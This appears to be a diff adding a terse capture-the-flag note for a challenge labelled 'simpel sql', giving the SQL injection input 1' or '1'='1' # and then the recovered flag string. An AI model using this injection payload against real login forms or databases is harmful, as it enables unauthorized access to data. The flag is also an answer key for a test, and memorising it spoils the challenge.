@@ -1,0 +1,7 @@
+simpel sql
+
+input 1' or '1'='1' #
+
+get flag
+
+flag{007553c6-70a9-4379-9075-1035e46f78b6}
